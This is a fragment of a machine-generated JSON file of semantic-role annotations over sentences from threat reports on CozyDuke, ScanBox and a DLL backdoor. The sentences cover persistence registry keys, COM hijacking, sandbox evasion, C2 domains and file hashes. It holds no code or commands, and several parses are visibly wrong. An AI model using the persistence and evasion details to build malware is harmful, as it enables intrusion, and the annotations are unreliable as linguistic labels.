system file rundll32.exe"}, "ARG2": {"text": "to the install location for CozyDuke"}}}, " The second category consists   \nof PE executable files that CozyDuke will write to disk  \nand execute on the infected host": {"consists": {"ARG1": {"text": "The second category"}, "V": {"text": "consists", "index": 3}, "ARG2": {"text": "of PE executable files that CozyDuke will write to disk and execute on the infected host"}}, "executable": {"V": {"text": "executable", "index": 6}, "ARG1": {"text": "files"}}, "will": {"V": {"text": "will", "index": 10}}, "write": {"ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 11}, "ARG2": {"text": "to disk"}}, "disk": {"ARG0": {"text": "CozyDuke"}, "V": {"text": "disk", "index": 13}, "ARG1": {"text": "the infected host"}}, "execute": {"ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 15}, "ARG1": {"text": "the infected host"}}, "infected": {"V": {"text": "infected", "index": 18}, "ARG1": {"text": "host"}}}, "\n Newer versions of the dropper will perform additional\n checks to ensure the dropper is not being executed inside\n a virtual machine or a known malware analysis sandbox\n environment": {"will": {"V": {"text": "will", "index": 5}}, "perform": {"ARG0": {"text": "Newer versions of the dropper"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "perform", "index": 6}, "ARG1": {"text": "additional checks"}, "ARGM-PNC": {"text": "to ensure the dropper is not being"}, "ARGM-ADV": {"text": "executed inside a virtual machine or a known malware analysis sandbox environment"}}, "ensure": {"ARG0": {"text": "Newer versions of the dropper"}, "V": {"text": "ensure", "index": 10}, "ARG1": {"text": "the dropper is not being executed inside a virtual machine or a known malware analysis sandbox environment"}}, "is": {"V": {"text": "is", "index": 13}}, "being": {"V": {"text": "being", "index": 15}}, "executed": {"ARG1": {"text": "the dropper"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "executed", "index": 16}, "ARGM-LOC": {"text": "inside a virtual machine or a known malware analysis sandbox environment"}}, "known": {"V": {"text": "known", "index": 23}, "ARG1": {"text": "malware analysis sandbox environment"}}}, "\n  CozyDuke may also register itself as a Windows service\n  or scheduled task": {"may": {"V": {"text": "may", "index": 1}}, "register": {"ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "may"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "register", "index": 3}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a Windows service or scheduled task"}}, "scheduled": {"V": {"text": "scheduled", "index": 10}, "ARG1": {"text": "task"}}}, " Upon execution, it will write two files to disk": {"will": {"ARGM-TMP": {"text": "Upon execution"}, "V": {"text": "will", "index": 4}, "ARG1": {"text": "write two files to disk"}}, "write": {"ARGM-TMP": {"text": "Upon execution"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 5}, "ARG1": {"text": "two files"}, "ARGM-PRD": {"text": "to disk"}}, "disk": {"V": {"text": "disk", "index": 9}}}, "\n For the purpose of managing tasks, the main component\n of CozyDuke implements 6 commands that the C&C\n server can specify": {"managing": {"V": {"text": "managing", "index": 4}, "ARG1": {"text": "tasks"}}, "can": {"V": {"text": "can", "index": 19}}, "specify": {"ARG1": {"text": "6 commands"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "the C&C server"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "specify", "index": 20}}}, "\n                                                                       \n  <heading> Command and control communication </heading>                                   \n  CozyDuke\u2019s main method of communicating with its                     \n  command and control server is using either HTTP or                   \n  HTTPS": {"is": {"ARG1": {"text": "CozyDuke \u2019s main method of communicating with its command and control server"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "using either HTTP or HTTPS"}}, "using": {"ARG0": {"text": "CozyDuke \u2019s main method of communicating with its command and control server"}, "V": {"text": "using", "index": 13}, "ARG1": {"text": "either HTTP or HTTPS"}}}, " CozyDuke will modify the\n  registry entries in such a way that any loading of the\n  SharedTaskScheduler COM object will first load a special\n  CozyDuke module that will ensure CozyDuke stays active\n  on the victim host": {"will": {"V": {"text": "will", "index": 1}}, "modify": {"ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "modify", "index": 2}, "ARG1": {"text": "the registry entries"}, "ARGM-MNR": {"text": "in such a way that any loading of the SharedTaskScheduler COM object will first load a special CozyDuke module that will ensure CozyDuke stays active on the victim host"}}, "will_2": {"ARG0": {"text": "any loading of the SharedTaskScheduler COM object"}, "V": {"text": "will", "index": 18}, "ARG1": {"text": "a special CozyDuke module that will ensure CozyDuke stays active on the victim host"}}, "load": {"ARG0": {"text": "any loading of the SharedTaskScheduler COM object"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "load", "index": 20}, "ARG2": {"text": "a special CozyDuke module that will ensure CozyDuke stays active on the victim host"}}, "will_3": {"V": {"text": "will", "index": 26}}, "ensure": {"ARG0": {"text": "a special CozyDuke module"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "ensure", "index": 27}, "ARG1": {"text": "CozyDuke stays active on the victim host"}}, "stays": {"ARG1": {"text": "CozyDuke"}, "V": {"text": "stays", "index": 29}, "ARG2": {"text": "active"}, "ARGM-LOC": {"text": "on the victim host"}}}, "            \nFinally, the CozyDuke toolset includes tools and scripts \u2013       \nsome custom-written, others based on openly available            \ntools \u2013 that are used for purposes such as gathering\nfurther information from infected hosts or for infecting         \nadditional hosts in the same target organization": {"includes": {"ARGM-DIS": {"text": "Finally"}, "ARG2": {"text": "the CozyDuke toolset"}, "V": {"text": "includes", "index": 5}, "ARG1": {"text": "tools and scripts \u2013 some custom - written , others based on openly available tools \u2013 that are used for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization"}}, "written": {"V": {"text": "written", "index": 13}}, "based": {"V": {"text": "based", "index": 16}, "ARG2": {"text": "on openly available tools \u2013 that are used for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization"}}, "are": {"V": {"text": "are", "index": 23}}, "used": {"ARG1": {"text": "tools \u2013"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 24}, "ARG2": {"text": "for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization"}}, "gathering": {"V": {"text": "gathering", "index": 29}, "ARG1": {"text": "further information from infected hosts"}}, "infecting": {"V": {"text": "infecting", "index": 37}, "ARG1": {"text": "additional hosts"}, "ARGM-LOC": {"text": "in the same target organization"}}}, "\n                                                                 \n                                                                 \n<heading> ATTACK OVERVIEW </heading>                                                 \n                                                                 \n<heading> Infection vector </heading>                                                 \nWe have observed CozyDuke being spread via email,                \nwhich usually contain a link to a compromised website            \nhosting a ZIP file (although in at least one case, the file was  \nhosted on Dropbox)": {"have": {"V": {"text": "have", "index": 1}}, "observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "CozyDuke being spread via email , which usually contain a link to a compromised website hosting a ZIP file ( although in at least one case , the file was hosted on Dropbox )"}}, "being": {"V": {"text": "being", "index": 4}}, "spread": {"ARG1": {"text": "CozyDuke"}, "V": {"text": "spread", "index": 5}, "ARGM-MNR": {"text": "via email , which usually contain a link to a compromised website hosting a ZIP file ( although in at least one case"}}, "contain": {"ARG0": {"text": "email"}, "R-ARG0": {"text": "which"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "contain", "index": 11}, "ARG1": {"text": "a link to a compromised website hosting a ZIP file ( although in at"}}, "compromised": {"V": {"text": "compromised", "index": 16}, "ARG1": {"text": "website"}}, "hosting": {"V": {"text": "hosting", "index": 18}, "ARG1": {"text": "a ZIP file ("}}, "was": {"V": {"text": "was", "index": 32}}, "hosted": {"ARGM-LOC": {"text": "in at least one case"}, "ARG1": {"text": "the file"}, "V": {"text": "hosted", "index": 33}, "ARGM-ADV": {"text": "on Dropbox )"}}}, "                                      \n                                                            \nThe most important functionalities offered by the main      \ncomponent are establishment of persistence, gathering       \nof basic system information, communication with the C&C     \nserver and the execution of additional tasks, modules or    \nexecutables as commanded by the C&C server": {"offered": {"ARG1": {"text": "The most important functionalities"}, "V": {"text": "offered", "index": 4}, "ARG0": {"text": "by the main component"}}, "are": {"ARG1": {"text": "The most important functionalities offered by the main component"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "establishment of persistence , gathering of basic system information , communication with the C&C server and the execution of additional tasks , modules or executables as commanded by the C&C server"}}, "commanded": {"V": {"text": "commanded", "index": 36}, "ARG0": {"text": "by the C&C server"}}}, " These files contain an executable            \nthat, upon execution, will write to disk and execute             \nCozyDuke, while at the same time presenting the user             \nwith a decoy to divert attention": {"contain": {"ARG0": {"text": "These files"}, "V": {"text": "contain", "index": 2}, "ARG1": {"text": "an executable that , upon execution , will write to disk and execute CozyDuke , while at the same time presenting the user with a decoy to divert attention"}}, "will": {"V": {"text": "will", "index": 10}}, "write": {"ARG0": {"text": "an executable"}, "R-ARG0": {"text": "that"}, "ARGM-TMP": {"text": "upon execution/ while at the same time presenting the user with a decoy to divert attention"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "write", "index": 11}, "ARG2": {"text": "to disk"}}, "disk": {"ARG0": {"text": "an executable"}, "R-ARG0": {"text": "that"}, "V": {"text": "disk", "index": 13}, "ARG1": {"text": "CozyDuke"}}, "execute": {"ARG0": {"text": "an executable"}, "R-ARG0": {"text": "that"}, "V": {"text": "execute", "index": 15}, "ARG1": {"text": "CozyDuke"}}, "presenting": {"ARG0": {"text": "an executable"}, "R-ARG0": {"text": "that"}, "ARGM-TMP": {"text": "at the same time"}, "V": {"text": "presenting", "index": 23}, "ARG1": {"text": "the user"}, "ARG3": {"text": "with a decoy"}, "ARGM-PRP": {"text": "to divert attention"}}, "divert": {"ARG0": {"text": "the user"}, "V": {"text": "divert", "index": 30}, "ARG1": {"text": "attention"}}}, "\n The dropper will then proceed to write the CozyDuke\n components to the specified location": {"will": {"V": {"text": "will", "index": 2}}, "proceed": {"ARG0": {"text": "The dropper"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceed", "index": 4}, "ARG1": {"text": "to write the CozyDuke components to the specified location"}}, "write": {"ARG0": {"text": "The dropper"}, "V": {"text": "write", "index": 6}, "ARG1": {"text": "the CozyDuke components"}, "ARG2": {"text": "to the specified location"}}, "specified": {"V": {"text": "specified", "index": 12}, "ARG1": {"text": "location"}}}, " Firstly,\nCozyDuke may set itself to be executed at system startup    \nby adding a registry value under any of the following       \nregistry keys:                                              \n<list>\n    \u2022\t HKLM\\Software\\Microsoft\\Windows\\                     \n       CurrentVersion\\Run\\                                  \n    \u2022\t HKCU\\Software\\Microsoft\\Windows\\                     \n       CurrentVersion\\Run\\                                  \n\n\n                     <figure></figure> <caption> FIGURE 3: SCREENSHOT OF A DECRYPTED COZYDUKE CONFIGURATION FILE </caption>\n\n    \u2022  HKLM\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n    \u2022  HKCU\\Software\\Microsoft\\Windows\\\n       CurrentVersion\\Policies\\Explorer\\Run\n</list>\n  The name of the registry value will usually be the\n  filename, (without the extension) of the CozyDuke main\n  component": {"may": {"V": {"text": "may", "index": 3}}, "set": {"ARGM-ADV": {"text": "Firstly"}, "ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "set", "index": 4}, "ARG1": {"text": "itself"}, "ARG2": {"text": "to be executed at system startup by adding a registry value under any of the following registry keys"}}, "be": {"V": {"text": "be", "index": 7}}, "executed": {"ARG1": {"text": "itself"}, "V": {"text": "executed", "index": 8}, "ARGM-LOC": {"text": "at system startup"}, "ARGM-MNR": {"text": "by adding a registry value under any of the following registry keys"}}, "adding": {"V": {"text": "adding", "index": 13}, "ARG1": {"text": "a registry value"}, "ARGM-MNR": {"text": "under any of the following registry keys"}}, "following": {"V": {"text": "following", "index": 21}, "ARG1": {"text": "registry keys"}}, "will": {"V": {"text": "will", "index": 31}}, "be_2": {"ARG1": {"text": "The name of the registry value"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "be", "index": 33}, "ARG2": {"text": "the filename , ( without the extension ) of the CozyDuke main component"}}}, " In this case, however, instead of dropping\nCozyDuke, the executables may drop other executables,    \nscripts or DLLs": {"dropping": {"V": {"text": "dropping", "index": 8}, "ARG1": {"text": "CozyDuke"}}, "may": {"ARGM-DIS": {"text": "however"}, "V": {"text": "may", "index": 13}}, "drop": {"ARGM-LOC": {"text": "In this case"}, "ARGM-DIS": {"text": "however"}, "ARGM-ADV": {"text": "instead of dropping CozyDuke"}, "ARG0": {"text": "the executables"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "drop", "index": 14}, "ARG1": {"text": "other executables , scripts or DLLs"}}}, " To achieve this, CozyDuke\n  will \u201chijack\u201d the registry entries for the COM object\n  \u201cSharedTaskScheduler\u201d": {"achieve": {"V": {"text": "achieve", "index": 1}, "ARG1": {"text": "this"}, "ARG0": {"text": "CozyDuke"}}, "will": {"ARGM-PRP": {"text": "To achieve this"}, "ARG0": {"text": "CozyDuke"}, "V": {"text": "will", "index": 5}, "ARG1": {"text": "\u201c hijack \u201d the registry entries"}}, "hijack": {"ARGM-PRP": {"text": "To achieve this"}, "ARG0": {"text": "CozyDuke"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "hijack", "index": 7}, "ARG1": {"text": "\u201d"}}}, "\n Tasks\n CozyDuke\u2019s primary purpose is the execution of tasks": {"is": {"ARG1": {"text": "Tasks CozyDuke \u2019s"}, "R-ARG1": {"text": "primary purpose"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "the execution of tasks"}}}, " The first consists of CozyDuke modules   \nwhich are DLL files loaded in memory by the main         \ncomponent of CozyDuke for the purposes of extending      \nCozyDuke\u2019s functionality": {"are": {"ARG1": {"text": "CozyDuke"}, "R-ARG1": {"text": "which"}, "V": {"text": "are", "index": 7}}, "loaded": {"ARG2": {"text": "CozyDuke modules/ by the main component of CozyDuke"}, "R-ARG2": {"text": "which"}, "ARG1": {"text": "DLL files"}, "V": {"text": "loaded", "index": 10}, "ARGM-TMP": {"text": "in memory"}, "ARGM-CAU": {"text": "for the purposes of extending CozyDuke \u2019s functionality"}}, "extending": {"V": {"text": "extending", "index": 23}, "ARG1": {"text": "CozyDuke \u2019s functionality"}}}, " This dropper will then proceed to         \nwrite to disk the main CozyDuke components as well as an      \nencrypted configuration file used by CozyDuke": {"will": {"V": {"text": "will", "index": 2}}, "proceed": {"ARG0": {"text": "This dropper"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceed", "index": 4}, "ARG1": {"text": "to write to disk the main CozyDuke components as well as an encrypted configuration file used by CozyDuke"}}, "write": {"ARG0": {"text": "This dropper"}, "V": {"text": "write", "index": 6}, "ARG1": {"text": "to disk the main CozyDuke components as well as an encrypted configuration file used by CozyDuke"}}, "disk": {"ARG0": {"text": "This dropper"}, "V": {"text": "disk", "index": 8}, "ARG1": {"text": "the main CozyDuke components as well as an encrypted configuration file used by CozyDuke"}}, "encrypted": {"V": {"text": "encrypted", "index": 17}, "ARG1": {"text": "configuration file"}}, "used": {"ARG1": {"text": "an encrypted configuration file"}, "V": {"text": "used", "index": 20}, "ARG0": {"text": "by CozyDuke"}}}, " In the cases we have observed, the               \n  configuration data for any single CozyDuke instance has              \n  included the details of either one or two C&C servers": {"have": {"V": {"text": "have", "index": 4}}, "observed": {"ARG1": {"text": "the cases"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 5}}, "has": {"V": {"text": "has", "index": 15}}, "included": {"ARGM-LOC": {"text": "In the cases we have observed"}, "ARG2": {"text": "the configuration data for any single CozyDuke instance"}, "V": {"text": "included", "index": 16}, "ARG1": {"text": "the details of either one or two C&C servers"}}}, " An example list is\n   shown in the following screenshot:\n\n\n\n<footnote>\n   1 http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-\n   1.html\n   2 https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-\n\n   hole-attacks\n</footnote>\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \f   Tactical Intelligence Bulletin \u2013 TLP:WHITE </header>\n\n\n\n\n   <heading> checkDrives </heading>\n   In one cluster of ScanBox activity, instead of checking for specific files as per the method above, the\n   attackers have implemented a different method of tracking files and drives present on the victim machine": {"is": {"V": {"text": "is", "index": 3}}, "shown": {"ARG1": {"text": "An example list"}, "V": {"text": "shown", "index": 4}, "ARGM-MNR": {"text": "in the following screenshot"}}, "following": {"V": {"text": "following", "index": 7}, "ARG2": {"text": "screenshot"}}, "checking": {"ARGM-ADV": {"text": "instead of"}, "V": {"text": "checking", "index": 19}, "ARG1": {"text": "for specific files"}, "ARGM-MNR": {"text": "as per the method above"}}, "have": {"V": {"text": "have", "index": 31}}, "implemented": {"ARGM-LOC": {"text": "In one cluster of ScanBox activity"}, "ARGM-ADV": {"text": "instead of checking for specific files as per the method above"}, "ARG0": {"text": "the attackers"}, "V": {"text": "implemented", "index": 32}, "ARG1": {"text": "a different method of tracking files and drives present on the victim machine"}}, "tracking": {"V": {"text": "tracking", "index": 37}, "ARG1": {"text": "files"}}, "drives": {"ARGM-LOC": {"text": "In one cluster of ScanBox activity"}, "ARG0": {"text": "the attackers"}, "V": {"text": "drives", "index": 40}, "ARG1": {"text": "present"}, "ARG2": {"text": "on the victim machine"}}}, " However one group of attackers using\n   the ScanBox framework are now actively sending e-mails to potential victims, where the e-mails contain\n   links to websites hosting ScanBox": {"using": {"ARG0": {"text": "one group of attackers"}, "V": {"text": "using", "index": 5}, "ARG1": {"text": "the ScanBox framework"}}, "are": {"V": {"text": "are", "index": 9}}, "sending": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "one group of attackers using the ScanBox framework"}, "ARGM-TMP": {"text": "now"}, "ARGM-MNR": {"text": "actively"}, "V": {"text": "sending", "index": 12}, "ARG1": {"text": "e - mails"}, "ARG4": {"text": "to potential victims , where the e - mails contain links to websites hosting ScanBox"}}, "contain": {"ARG0": {"text": "the e - mails"}, "V": {"text": "contain", "index": 25}, "ARG1": {"text": "links to websites hosting ScanBox"}}, "hosting": {"V": {"text": "hosting", "index": 29}, "ARG0": {"text": "ScanBox"}}}, "\n\n   For those who didn\u2019t read our last entry on the framework, nor the excellent work by Jaime Blasco2 which\n   preceded it, ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform\n   reconnaissance and key logging of visitors to compromised websites without requiring any malware to be\n   downloaded or installed": {"did": {"V": {"text": "did", "index": 3}}, "read": {"ARG0": {"text": "those"}, "R-ARG0": {"text": "who"}, "ARGM-NEG": {"text": "n\u2019t"}, "V": {"text": "read", "index": 5}, "ARG1": {"text": "our last entry on the framework"}}, "preceded": {"ARG0": {"text": "Jaime Blasco2"}, "V": {"text": "preceded", "index": 21}, "ARG1": {"text": "it"}}, "is": {"ARGM-GOL": {"text": "For those who did n\u2019t read our last entry on the framework , nor the excellent work by Jaime Blasco2 which preceded it"}, "ARG1": {"text": "ScanBox"}, "V": {"text": "is", "index": 25}, "ARG2": {"text": "a framework written in JavaScript and PHP which allows an attacker to perform reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded or installed"}}, "written": {"ARG1": {"text": "a framework"}, "V": {"text": "written", "index": 28}, "ARGM-LOC": {"text": "in JavaScript and PHP"}}, "allows": {"ARG0": {"text": "a framework written in JavaScript and PHP"}, "R-ARG0": {"text": "which"}, "V": {"text": "allows", "index": 34}, "ARG1": {"text": "an attacker to perform reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded or installed"}}, "perform": {"ARG0": {"text": "an attacker"}, "V": {"text": "perform", "index": 38}, "ARG1": {"text": "reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded"}}, "compromised": {"V": {"text": "compromised", "index": 46}, "ARG1": {"text": "websites"}}, "requiring": {"V": {"text": "requiring", "index": 49}, "ARG2": {"text": "any malware"}, "ARG1": {"text": "to be downloaded or installed"}}, "be": {"ARG1": {"text": "any malware"}, "V": {"text": "be", "index": 53}, "ARG2": {"text": "downloaded or installed"}}, "downloaded": {"ARG1": {"text": "any malware"}, "V": {"text": "downloaded", "index": 54}}, "installed": {"ARG1": {"text": "any malware"}, "V": {"text": "installed", "index": 56}}}, "\n\n\n\n\n<footer> Cyber Threat Operations </footer>\n\n<header> \f   Tactical Intelligence Bulletin \u2013 TLP:WHITE </header>\n\n   Whilst macanna.com[.]tw appears to be a legitimate site, it has also been observed as being a command\n   and control destination for malware": {"appears": {"V": {"text": "appears", "index": 2}, "C-ARG1": {"text": "to be a legitimate site"}}, "be": {"ARG1": {"text": "Whilst macanna.com[.]tw"}, "V": {"text": "be", "index": 4}, "ARG2": {"text": "a legitimate site"}}, "has": {"V": {"text": "has", "index": 10}}, "been": {"V": {"text": "been", "index": 12}}, "observed": {"ARG1": {"text": "it"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 13}, "ARGM-PRD": {"text": "as being a command and control destination for malware"}}, "being": {"V": {"text": "being", "index": 15}, "ARG2": {"text": "a command and control destination for malware"}}}, "\n\n      ScanBox performs keylogging of users when they visit a compromised website, without requiring malware\n      to be deployed, and can collect a great deal of information which can be used to tailor future attacks\n\n      In October we published some details of the ScanBox tool set": {"performs": {"ARG0": {"text": "ScanBox"}, "V": {"text": "performs", "index": 1}, "ARG1": {"text": "keylogging of users"}, "ARGM-TMP": {"text": "when they visit a compromised website , without requiring malware to be deployed"}}, "visit": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "they"}, "V": {"text": "visit", "index": 7}, "ARG1": {"text": "a compromised website"}, "ARGM-PRD": {"text": "without requiring malware to be deployed"}}, "compromised": {"V": {"text": "compromised", "index": 9}, "ARG1": {"text": "website"}}, "requiring": {"V": {"text": "requiring", "index": 13}, "ARG1": {"text": "malware/ to be deployed"}}, "be": {"V": {"text": "be", "index": 16}}, "deployed": {"ARG1": {"text": "requiring malware"}, "V": {"text": "deployed", "index": 17}}, "can": {"V": {"text": "can", "index": 20}}, "collect": {"ARGM-MOD": {"text": "can"}, "V": {"text": "collect", "index": 21}, "ARG1": {"text": "a great deal of information which can be used to tailor future attacks In October"}}, "can_2": {"V": {"text": "can", "index": 28}}, "be_2": {"V": {"text": "be", "index": 29}}, "used": {"ARG1": {"text": "information"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 30}, "ARG2": {"text": "to tailor future attacks In October"}}, "tailor": {"ARG0": {"text": "which"}, "V": {"text": "tailor", "index": 32}, "ARG1": {"text": "future attacks"}, "ARGM-TMP": {"text": "In October"}}, "published": {"R-ARG0": {"text": "deal of information which can be used to tailor future attacks In October"}, "ARG0": {"text": "we"}, "V": {"text": "published", "index": 38}, "ARG1": {"text": "some details of the ScanBox tool set"}}, "set": {"ARG1": {"text": "the ScanBox tool"}, "V": {"text": "set", "index": 45}}}, "\n\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments\nreturned from the C2 using the following format: \"<!\u00ad\u00ad?*$@COMMAND\u00a0GOES\u00a0HERE@$*?\u00ad\u00ad!>\u037e\"however,\nthe C2 was not active at the time of analysis so this could not be confirmed.\u00a0 The backdoor may also make\nrequests to the C2 over HTTP using the following parameters in the URI string \"query?sid=\" and \"result?\nsid=\".\u00a0\n\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no\nother instances of this path could be identified.\u00a0 Several additional exploit documents were identified by\ninvestigating the domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\"": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "upon some cursory analysis"}}, "will": {"ARGM-ADV": {"text": "Based upon some"}, "ARG0": {"text": "the backdoor"}, "V": {"text": "will", "index": 7}, "ARG1": {"text": "look for encrypted commands within HTML comments returned from the C2 using the following format : \" \u037e\"however/ by investigating the domains \" fighthard.mooo.com \" and \" rampage.freetcp.com \""}}, "look": {"ARGM-ADV": {"text": "Based upon some cursory analysis"}, "ARG0": {"text": "the backdoor"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "look", "index": 8}, "ARG1": {"text": "for encrypted commands within HTML comments returned from the C2 using the following format"}}, "encrypted": {"V": {"text": "encrypted", "index": 10}, "ARG1": {"text": "commands"}, "ARGM-LOC": {"text": "within HTML comments returned from the C2"}}, "returned": {"ARG1": {"text": "HTML comments"}, "V": {"text": "returned", "index": 15}, "ARG3": {"text": "from the C2"}, "ARGM-MNR": {"text": "using the following format"}}, "using": {"V": {"text": "using", "index": 19}, "ARG1": {"text": "the following format"}}, "following": {"V": {"text": "following", "index": 21}}, "was": {"ARGM-ADV": {"text": "\u037e\"however"}, "ARG1": {"text": "the C2"}, "V": {"text": "was", "index": 29}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "active"}, "ARGM-TMP": {"text": "at the time of analysis"}, "ARGM-PRP": {"text": "so this could not be confirmed"}}, "could": {"V": {"text": "could", "index": 39}}, "be": {"V": {"text": "be", "index": 41}}, "confirmed": {"ARG1": {"text": "this"}, "ARGM-MOD": {"text": "could"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "confirmed", "index": 42}}, "may": {"V": {"text": "may", "index": 46}}, "make": {"ARG0": {"text": "The backdoor"}, "ARGM-MOD": {"text": "may"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "make", "index": 48}, "ARG1": {"text": "requests to the C2 over HTTP using the following parameters in the URI string \" query?sid= \" and \" result ? sid= \" . The PDB path"}}, "using_2": {"V": {"text": "using", "index": 55}, "ARG1": {"text": "the following parameters in the URI string \" query?sid= \""}}, "following_2": {"V": {"text": "following", "index": 57}, "ARG1": {"text": "parameters"}}, "result": {"V": {"text": "result", "index": 68}, "ARG1": {"text": "The PDB path"}}, "was_2": {"V": {"text": "was", "index": 79}}, "left": {"ARG1": {"text": "The/ C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb"}, "ARGM-ADV": {"text": "also/ although no other instances of this path could be identified . Several additional exploit documents were identified by investigating the domains \" fighthard.mooo.com \" and \" rampage.freetcp.com/ \""}, "V": {"text": "left", "index": 81}, "ARGM-LOC": {"text": "in the backdoor"}}, "could_2": {"V": {"text": "could", "index": 92}}, "be_2": {"V": {"text": "be", "index": 93}}, "identified": {"ARG1": {"text": "no other instances of this path"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "identified", "index": 94}}, "were": {"V": {"text": "were", "index": 100}}, "identified_2": {"ARG1": {"text": "Several additional exploit documents"}, "V": {"text": "identified", "index": 101}, "ARG2": {"text": "by investigating the domains \" fighthard.mooo.com \" and \" rampage.freetcp.com"}}, "investigating": {"V": {"text": "investigating", "index": 103}, "ARG1": {"text": "the domains \" fighthard.mooo.com \" and \" rampage.freetcp.com"}}}, " The\nbackdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via\nLoadLibrary it will begin spawning malicious threads.\u00a0\n\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick\ngoogle search will lead you to a YARA rule written by Patrick Olsen and the very similar sample\n869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80": {"exists": {"ARG1": {"text": "The backdoor routine"}, "V": {"text": "exists", "index": 3}, "ARGM-LOC": {"text": "inside the DllMain function"}, "C-ARG1": {"text": "so when explorer.exeloads the backdoor via LoadLibrary it will begin spawning malicious threads . A PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb ; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80"}}, "explorer.exeloads": {"ARGM-TMP": {"text": "when"}, "V": {"text": "explorer.exeloads", "index": 10}, "ARG1": {"text": "the backdoor"}, "ARGM-MNR": {"text": "via LoadLibrary"}}, "will": {"V": {"text": "will", "index": 16}}, "begin": {"ARGM-TMP": {"text": "when the backdoor via LoadLibrary"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "begin", "index": 17}, "ARG1": {"text": "spawning malicious threads"}}, "spawning": {"ARG0": {"text": "it"}, "V": {"text": "spawning", "index": 18}, "ARG1": {"text": "malicious threads"}}, "was": {"V": {"text": "was", "index": 25}}, "left": {"ARG1": {"text": "A PDB path"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "left", "index": 27}, "ARGM-LOC": {"text": "in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb"}}, "will_2": {"ARG0": {"text": "A quick google search"}, "V": {"text": "will", "index": 37}, "ARG1": {"text": "lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80"}}, "lead": {"ARG0": {"text": "A quick google search"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "lead", "index": 38}, "ARG1": {"text": "you"}, "ARG4": {"text": "to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80"}}, "written": {"ARG1": {"text": "a YARA rule"}, "V": {"text": "written", "index": 44}, "ARG0": {"text": "by Patrick Olsen"}}, "communicates": {"ARG1": {"text": "a YARA/ the very similar sample 869fa4dfdbabfabe87d334f85ddda234"}, "R-ARG1": {"text": "which"}, "V": {"text": "communicates", "index": 55}, "ARG2": {"text": "to www.micro1.zyns.com on TCP port 80"}}}, " Interestingly the backdoor will also load the legitimate\nsystem32\\msacm32.drv\u00a0file resolve functions and pass calls to it so it doesn't break audio playback on the\nvictim system.\u00a0 The backdoor contains 